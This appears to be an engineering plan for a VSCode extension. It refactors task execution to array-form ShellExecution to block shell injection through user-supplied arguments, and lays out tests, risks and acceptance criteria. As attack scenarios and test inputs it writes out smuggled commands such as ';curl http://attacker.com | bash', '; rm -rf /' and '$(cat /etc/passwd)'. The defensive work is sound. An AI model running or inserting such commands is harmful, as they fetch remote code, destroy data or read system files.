# Plan: argv Security Refactor — Eliminate Shell-String Injection

**Status:** Draft
**Branch:** v1.10.1
**Area:** Task Execution Security

---

## 1. Objective

Refactor all task execution paths to use the **array-form** `ShellExecution(command, args[], options)`
instead of the **string-form** `ShellExecution(commandLine, options)`.

When the string form is used, the shell receives the entire command line as a single interpreted
string. Any shell metacharacters — `;`, `&&`, `||`, `|`, `$(...)`, backticks — embedded in
user-supplied arguments are executed literally, creating a shell injection vector.

When the array form is used, VSCode quotes each argument before passing it to the shell. A
user argument of `"; rm -rf /"` becomes `'"; rm -rf /"'` on the shell, treating it as a literal
string value rather than shell code.

---

## 2. Background

The extension builds `vscode.Task` objects that include a `ShellExecution`. VSCode's
`ShellExecution` has two construction forms:

| Form | Signature | Security |
|------|-----------|----------|
| String form | `new ShellExecution(commandLine, options?)` | Unsafe: shell parses the whole line |
| Array form | `new ShellExecution(command, args[], options?)` | Safe: each arg is shell-quoted by VSCode |

Most providers already use the array form via `buildShellTask()` in `taskCreationUtils.ts`.
However, three code paths in `taskFactory.ts` still use the string form, and one uses
incorrect argument splitting.

---

## 3. Current Vulnerabilities

### 3.1 `workspace-task` case — `injectArgs()` + string ShellExecution

**File:** `src/taskFactory.ts` (lines ≈110–120)

```typescript
// VULNERABLE
const fullCommand = injectArgs(declared, args);  // string concatenation
new vscode.ShellExecution(fullCommand, { cwd }); // string-form
```

**Attack scenario:** User invokes "Run with Args" and types `;curl http://attacker.com | bash`.
`injectArgs("npm install", ";curl http://attacker.com | bash")` produces the string
`npm install ;curl http://attacker.com | bash`, and the shell executes all three commands.

### 3.2 `dockerfile` case — naive string concatenation + string ShellExecution

**File:** `src/taskFactory.ts` (lines ≈230–245)

```typescript
// VULNERABLE
const fullCommand = args ? `${command} ${args}` : command;
new vscode.ShellExecution(fullCommand, { cwd }); // string-form
```

Same injection risk — user args are concatenated directly without quoting.

### 3.3 `shell` case (no interpreter) — string concatenation + string ShellExecution

**File:** `src/taskFactory.ts` (lines ≈195–215)

```typescript
// VULNERABLE
commandString = `"${resourceUri.fsPath}"`;
if (args) {
  commandString += ` ${shellArgs.slice(1).join(' ')}`;
}
shellExec = new vscode.ShellExecution(commandString, { cwd }); // string-form
```

User args from "Run with Args" are appended to the command string without quoting.

### 3.4 `shell` case (with interpreter) — incorrect arg splitting

**File:** `src/taskFactory.ts` (lines ≈186–190)

```typescript
// BUG: does not handle quoted arguments
if (args) {
  shellArgs.push(...args.split(' '));  // "My Dir" becomes ["\"My", "Dir\""]
}
```

`String.split(' ')` does not respect quoted tokens. `splitArgs()` (already available in
`taskCreationUtils.ts`) does handle quotes and should be used instead.

---

## 4. Design

### 4.1 New Utility: `injectArgsArray()`

Add to `src/libs/taskCreationUtils.ts`:

```typescript
/**
 * Parses a command string into an executable + args array, then injects user-supplied
 * arguments. This is the secure replacement for injectArgs() — the returned values are
 * suitable for ShellExecution(command, args, options), preventing shell injection.
 *
 * Injection rules:
 *  - If the parsed args array contains a token that exactly equals "${args}", all such
 *    tokens are replaced by the elements of splitArgs(userArgs).
 *  - If a token contains "${args}" as an embedded substring (e.g. "--name=${args}"),
 *    the substring is replaced with splitArgs(userArgs).join(' '), keeping it a single token.
 *  - If no "${args}" token is found, splitArgs(userArgs) elements are appended at the end.
 *
 * @param commandString  Resolved command string (may contain "${args}" placeholder).
 * @param userArgs       Raw user-typed argument string from "Run with Args", or undefined.
 * @returns              { command, args } ready for new ShellExecution(command, args, options).
 */
export function injectArgsArray(
  commandString: string,
  userArgs?: string,
): { command: string; args: string[] } {
  const tokens = splitArgs(commandString);
  if (tokens.length === 0) {
    return { command: commandString.trim(), args: [] };
  }

  const [executable, ...baseArgs] = tokens;
  const userArgTokens = splitArgs(userArgs);

  // No user args to inject — strip any ${args} placeholder tokens so the shell does not
  // receive the literal string "${args}" as an argument, then return.
  if (userArgTokens.length === 0) {
    const cleanArgs = baseArgs.filter((a) => !a.includes('${args}'));
    return { command: executable, args: cleanArgs };
  }

  const hasExact = baseArgs.includes('${args}');
  const hasPartial = !hasExact && baseArgs.some((a) => a.includes('${args}'));

  if (hasExact) {
    // Replace every exact "${args}" token with the user arg tokens.
    // NOTE: Any other shell operator tokens (&&, ||, |, ;) that appear in the base command
    // string (from workspace config) will also become quoted literal args in array form.
    // This is a known breaking semantic change for compound workspace commands — see §9.
    const finalArgs: string[] = [];
    for (const token of baseArgs) {
      if (token === '${args}') {
        finalArgs.push(...userArgTokens);
      } else {
        finalArgs.push(token);
      }
    }
    return { command: executable, args: finalArgs };
  }

  if (hasPartial) {
    // Replace "${args}" substring within tokens with user args joined as a single value.
    // The entire token (e.g. "--name=val1 val2") remains a single shell argument,
    // preventing injection via multi-token expansion.
    const joined = userArgTokens.join(' ');
    const finalArgs = baseArgs.map((a) => a.replace(/\$\{args\}/g, joined));
    return { command: executable, args: finalArgs };
  }

  // No placeholder — append user args at end
  return { command: executable, args: [...baseArgs, ...userArgTokens] };
}
```

**Tokenization note:** `injectArgsArray()` relies on `splitArgs()` to parse the command string
into tokens. `splitArgs()` already handles single- and double-quoted tokens with embedded spaces,
so `'"My Tool" run --flag'` correctly produces `["My Tool", "run", "--flag"]`.

**`${args}` in the executable position:** If a workspace task defines `command = "${args} run"`,
`injectArgsArray` tokenizes to `executable = "${args}"` and `baseArgs = ["run"]`. The `${args}`
token does not appear in `baseArgs`, so user args are appended: `{command: "${args}", args: ["run", ...userArgs]}`. This results in `ShellExecution` trying to execute a binary literally named
`${args}`, which will fail. This edge case is **explicitly unsupported** — workspace task configs
should never use `${args}` as the executable itself.

### 4.2 Deprecate `injectArgs()`

`injectArgs()` in `src/taskFactory.ts` will be annotated `@deprecated` but kept intact. It is
still actively imported by `src/test/suite/injectArgs.test.ts`, so it **cannot be removed** in
this PR. After this refactor:

- `injectArgs()` is no longer used to build any `ShellExecution`.
- The `command` property on `CreatedTask` (used for logging/display) is derived from the result
  of `injectArgsArray()`:  `command = args.length > 0 ? \`${command} ${args.join(' ')}\` : command`.

**Known display limitation:** When a user passes quoted args like `--name 'John Doe'`, the
display command string becomes `"npm run --name John Doe"` (quotes stripped), making it look like
four args instead of two. This is cosmetic only and does not affect execution.

### 4.3 Changes to `taskFactory.ts`

#### 4.3.1 `workspace-task` case

**Before:**
```typescript
const fullCommand = injectArgs(declared, args);
new vscode.ShellExecution(fullCommand, { cwd })
```

**After:**
```typescript
const { command: execCmd, args: execArgs } = injectArgsArray(declared, args);
const displayCommand = execArgs.length > 0 ? `${execCmd} ${execArgs.join(' ')}` : execCmd;
new vscode.ShellExecution(execCmd, execArgs, { cwd })
// returned CreatedTask.command = displayCommand
```

#### 4.3.2 `dockerfile` case

**Before:**
```typescript
const fullCommand = args ? `${command} ${args}` : command;
new vscode.ShellExecution(fullCommand, { cwd })
```

**After:**
```typescript
const { command: execCmd, args: execArgs } = injectArgsArray(command, args);
const displayCommand = execArgs.length > 0 ? `${execCmd} ${execArgs.join(' ')}` : execCmd;
new vscode.ShellExecution(execCmd, execArgs, { cwd })
```

#### 4.3.3 `shell` case — no interpreter

**Before:**
```typescript
commandString = `"${resourceUri.fsPath}"`;
if (args) {
  commandString += ` ${shellArgs.slice(1).join(' ')}`;
}
shellExec = new vscode.ShellExecution(commandString, { cwd });
```

**After:**
```typescript
const scriptUserArgs = splitArgs(args);
shellExec = new vscode.ShellExecution(resourceUri.fsPath, scriptUserArgs, { cwd });
commandString = scriptUserArgs.length > 0
  ? `"${resourceUri.fsPath}" ${scriptUserArgs.join(' ')}`
  : `"${resourceUri.fsPath}"`;
```

`ShellExecution` in array form quotes the path automatically; explicit quoting in the display
string is kept for human readability only.

**Platform note (Windows):** The original string form used explicit double quotes (`"path"`) which
is conventional on Windows. VSCode's array-form `ShellExecution` uses `ShellQuotingOptions` per
shell (cmd.exe uses `"`, PowerShell uses single-quote for strong quoting). Implementations must
manually verify that no-interpreter shell tasks with paths containing spaces execute correctly
on Windows after this change. Add this as a manual acceptance criterion.

#### 4.3.4 `shell` case — with interpreter (bug fix)

**Before:**
```typescript
if (args) {
  shellArgs.push(...args.split(' '));  // BUG
}
```

**After:**
```typescript
shellArgs.push(...splitArgs(args));  // FIXED
```

Import `splitArgs` and `injectArgsArray` from `taskCreationUtils` in `taskFactory.ts`.

**Pre-existing out-of-scope limitation:** When `interpreter` is a multi-word string such as
`"wsl.exe /bin/bash"`, passing it as the `command` argument to array-form `ShellExecution` causes
VSCode to look for a binary literally named `"wsl.exe /bin/bash"`, which fails. This bug predates
this refactor and is **out of scope** — it is noted here so implementers do not accidentally
assume the `splitArgs` fix also resolves multi-word interpreter support.

---

## 5. Files to Modify

| File | Change |
|------|--------|
| `src/libs/taskCreationUtils.ts` | Add `injectArgsArray()` and export it |
| `src/taskFactory.ts` | Fix 4 execution paths; import `splitArgs`; `@deprecated` `injectArgs` |

---

## 6. Files to Add / Update (Tests)

| File | Action | Description |
|------|--------|-------------|
| `src/test/suite/taskCreationUtils.test.ts` | **Update** | Add `injectArgsArray()` suite (all cases including injection attacks) — consistent with existing pattern of testing utilities in their source-file counterpart |
| `src/test/suite/taskFactoryWorkspaceTask.test.ts` | **Update** | Assert `ShellExecution` uses array form; assert injection strings are not executed |
| `src/test/suite/taskFactoryShell.test.ts` | **Update** | Fix two existing tests that assert `exec.commandLine` (see §7.3); add array-form assertion for no-interpreter path |

**Note:** A separate `injectArgsArray.test.ts` file is **not** created. The `injectArgsArray()`
tests belong in `taskCreationUtils.test.ts` to match the existing convention of one test file
per source module (`splitArgs()` tests are already in that file).

---

## 7. Test Strategy

### 7.1 Unit Tests for `injectArgsArray()`

File: `src/test/suite/taskCreationUtils.test.ts` (new suite added to existing file)

Tests to include:

| Scenario | Input | Expected |
|----------|-------|----------|
| No user args | `("npm run build")` | `{command:"npm", args:["run","build"]}` |
| Append user args | `("npm run build", "--watch")` | `{command:"npm", args:["run","build","--watch"]}` |
| Exact `${args}` replacement | `("docker run ${args} alpine", "--rm")` | `{command:"docker", args:["run","--rm","alpine"]}` |
| Multiple `${args}` tokens | `("echo ${args} && echo ${args}", "x")` | `{command:"echo", args:["x","&&","echo","x"]}` — `&&` from the base command string becomes a **literal quoted arg**; see §9 for breaking change implications |
| No user args, with `${args}` placeholder | `("docker run ${args} alpine", undefined)` | `{command:"docker", args:["run","alpine"]}` — placeholder stripped, not passed literally to shell |
| Partial `${args}` in token | `("tool --name=${args} end", "myval")` | `{command:"tool", args:["--name=myval","end"]}` |
| Partial match, multi-token user args | `("tool --name=${args}", "val1 val2")` | `{command:"tool", args:["--name=val1 val2"]}` — entire value stays one token |
| **Injection via partial match** | `("tool --cmd=${args}", "; rm -rf /")` | `{command:"tool", args:["--cmd=; rm -rf /"]}` — semicolon embedded inside token, not standalone |
| Quoted path as command | `('"My Tool" run', "--flag")` | `{command:"My Tool", args:["run","--flag"]}` |
| Quoted user arg | `("npm run build", "--name 'John Doe'")` | `{command:"npm", args:["run","build","--name","John Doe"]}` |
| **Injection: shell operator in args** | `("npm install", "; rm -rf /")` | `{command:"npm", args:["install",";","rm","-rf","/"]}` — operators are literal tokens |
| **Injection: pipe in args** | `("cat file", "\| tee /tmp/out")` | `{command:"cat", args:["file","\|","tee","/tmp/out"]}` |
| **Injection: subshell in args** | `("echo", "$(cat /etc/passwd)")` | `{command:"echo", args:["$(cat /etc/passwd)"]}` — VSCode quotes this at execution (POSIX: single-quote; PowerShell: see platform caveat below) |
| **Injection: in `${args}` placeholder** | `("docker run ${args} alpine", "; rm -rf /")` | `{command:"docker", args:["run",";","rm","-rf","/","alpine"]}` — tokens, not shell code |
| Empty command string | `("")` | `{command:"", args:[]}` |
| Whitespace-only command | `("   ")` | `{command:"", args:[]}` |
| No args, no placeholder | `("echo hello")` | `{command:"echo", args:["hello"]}` |

**Key assertion for injection tests:** The `args` array elements are plain strings. When passed to
`ShellExecution(command, args, options)`, VSCode wraps each in shell quotes, making them inert.
The test verifies that the tokens are *present in the array* (not merged into the command string)
and that no shell metacharacter is interpreted at the `injectArgsArray()` level — VSCode handles
quoting at execution time.

**Platform caveat — PowerShell and `$(...)` injection:** On Windows, VSCode may use double-quote
quoting for PowerShell, which does not prevent `$(...)` subexpression evaluation. Preventing
PowerShell-specific injection is VSCode's responsibility via `ShellQuotingOptions.strong`. The
extension correctly delegates to VSCode by using the array form; no additional escaping is needed
in extension code.

### 7.2 Updates to `taskFactoryWorkspaceTask.test.ts`

Add assertions that verify the `ShellExecution` is in **array form**:

```typescript
test('workspace-task uses array-form ShellExecution (no injection)', async () => {
  WorkspaceTasksService.getInstance().resolveTaskCommand = async () => 'docker run ${args} alpine:latest';
  const item = new TaskItem('Run Docker', vscode.TreeItemCollapsibleState.None, 'workspace-task', uri);
  item.taskSource = 'shell';
  item.taskFileUri = uri;

  const created = await createTaskForItem(item, '; rm -rf /');
  assert.ok(created);
  const exec = created!.task.execution as vscode.ShellExecution;
  // Must be array form — commandLine must be undefined
  assert.strictEqual(exec.commandLine, undefined, 'Must not use string-form ShellExecution');
  assert.strictEqual(exec.command, 'docker', 'Executable must be docker');
  // Injection attempt must be a literal arg, not shell code
  assert.ok(exec.args.some((a) => typeof a === 'string' && a === ';'),
    'Semicolon must appear as a literal array element, not shell operator');
});
```

### 7.3 Updates to `taskFactoryShell.test.ts`

**Existing tests that will break and must be updated:**

- `'executes script directly (no interpreter prefix) when useShebang is true'`
  Currently asserts `exec.commandLine` (string-form field). After the fix, `exec.commandLine`
  is `undefined` and `exec.command` / `exec.args` hold the execution data. Update to assert on
  `exec.command` (the script path) instead.

- `'command string for direct execution contains the script path'`
  Same issue — asserts `exec.commandLine`. Update similarly.

Add test for no-interpreter path using array form:

```typescript
test('no-interpreter shell task uses array-form ShellExecution with user args', async () => {
  const uri = shellUri('with-shebang.sh');
  const item = new TaskItem('with-shebang.sh', vscode.TreeItemCollapsibleState.None, 'shell', uri);
  item.metadata = { interpreter: '', subType: 'bash', useShebang: true };

  const created = await createTaskForItem(item, '--config "my config.json"');
  assert.ok(created);
  const exec = created!.task.execution as vscode.ShellExecution;
  assert.strictEqual(exec.commandLine, undefined, 'Must not use string-form');
  assert.ok(Array.isArray(exec.args));
  // splitArgs() should parse the quoted arg correctly
  assert.ok(exec.args.some((a) => a === 'my config.json'),
    'Quoted arg should be a single element without quotes');
});
```

### 7.4 Running Targeted Tests

To run only affected test suites during development:

```bash
# Run taskCreationUtils tests (includes injectArgsArray suite)
npm test -- --grep "taskCreationUtils"

# Run workspace task factory tests
npm test -- --grep "Task Factory Workspace Task"

# Run shell factory tests
npm test -- --grep "TaskFactory Shell"

# Run all tests after completing the change
npm test
```

---

## 8. Documentation Updates

| File | Change |
|------|--------|
| `docs/features/running-tasks.md` (or equivalent) | Note that "Run with Args" arguments are now passed as array elements; shell metacharacters are treated literally |
| `docs/configuration/task-action.md` (or equivalent) | Document that `${args}` in workspace task commands is supported as a standalone token; embedded use (e.g. `--key=${args}`) treats the entire key as a single quoted argument |

---

## 9. Risks and Mitigations

| Risk | Mitigation |
|------|-----------|
| Workspace task command strings using `&&`, `\|\|`, `\|`, `;` shell operators **in the base command** break silently | These task authors must split into VSCode compound tasks (`dependsOn`) or use a wrapper script. Document as a known breaking change. |
| Existing workspace tasks that rely on shell operators passed **via `${args}`** break | Document the change; treating injected shell operators as literal strings is the intended security improvement |
| Command strings with complex quoting fail to tokenize correctly | `splitArgs()` handles single/double quotes; add tests for edge cases before merging |
| `dockerfile` tasks that relied on shell piping through args break | The Dockerfile provider path is rarely used with dynamic args; document as breaking change |
| Display `command` string drops quotes (e.g. `--name 'John Doe'` displays as four args) | Cosmetic only; document as known limitation |
| ShellExecution array form quoting differs per platform (Win/macOS/Linux) | Delegate to VSCode via array form; verify no-interpreter shell tasks with space-containing paths work on Windows (manual acceptance criterion) |

---

## 10. Out of Scope

The following are **not** changed in this refactoring:

- `WorkspaceTasksService.resolveTaskCommand()` — continues to return a command string. The
  string is parsed by `injectArgsArray()` at the call site in `taskFactory.ts`.
- Provider `createTask()` methods — all already use array-form `buildShellTask()` or direct
  `ShellExecution(command, args, options)`. No changes needed.
- `execFile` calls in providers (justfile, gitlab-ci, rake, taskfile) — these are for task
  discovery only and already use the safe `execFile(cmd, argsArray, options)` form from Node.js.
- `taskSecretWarningService.ts` — uses `execFile('git', [...], ...)` for security checks; already
  array form.
- The `splitArgs()` function itself — it works correctly and is reused by `injectArgsArray()`.
- `injectArgs()` function tests (`injectArgs.test.ts`) — the function is deprecated but kept;
  existing tests continue to pass.

---

## 11. Implementation Sequence

> **TDD order:** Write failing tests first, then implement the code to make them pass.

1. **Write `injectArgsArray()` tests** in `taskCreationUtils.test.ts` (new suite). Run with
   `npm test -- --grep "taskCreationUtils"` — tests **must fail** (function not yet defined).
2. **Implement `injectArgsArray()`** in `taskCreationUtils.ts` and export it. Run tests again
   to confirm all pass.
3. **Update failing `taskFactoryShell.test.ts` tests** that assert `exec.commandLine` (two tests
   — see §7.3). Adjust assertions to use `exec.command` / `exec.args`. These tests should pass
   with the current (unfixed) code as a baseline before patching `taskFactory.ts`.
4. **Add new tests** to `taskFactoryWorkspaceTask.test.ts` and `taskFactoryShell.test.ts` that
   assert array-form execution and injection safety. These tests **must fail** at this point.
5. **Patch `taskFactory.ts`**:
   a. Import `splitArgs` and `injectArgsArray` from `taskCreationUtils`.
   b. Fix `workspace-task` case.
   c. Fix `dockerfile` case.
   d. Fix `shell` case — no interpreter (array form).
   e. Fix `shell` case — with interpreter (`splitArgs` instead of `split`).
   f. Mark `injectArgs()` as `@deprecated`.
6. **Run targeted test suites** with `npm test -- --grep "taskCreationUtils|Task Factory Workspace Task|TaskFactory Shell"` — all must pass.
7. **Run full test suite** with `npm test`. Verify no regressions.
8. **Update documentation** in `docs/`.

---

## 12. Acceptance Criteria

- [ ] `injectArgsArray()` is exported from `taskCreationUtils.ts`.
- [ ] The `injectArgsArray()` suite in `taskCreationUtils.test.ts` passes with 100% coverage of
      the new function, including all injection attack scenarios listed in §7.1.
- [ ] The `workspace-task`, `dockerfile`, and `shell` (no-interpreter) cases in `taskFactory.ts` always use array-form `ShellExecution`, regardless of whether user args are provided.
- [ ] `args.split(' ')` no longer appears in `taskFactory.ts`; replaced with `splitArgs()`.
- [ ] `injectArgs()` is annotated `@deprecated` in `taskFactory.ts`.
- [ ] All existing tests continue to pass (`npm test`).
- [ ] Documentation updated to reflect array-arg behavior.
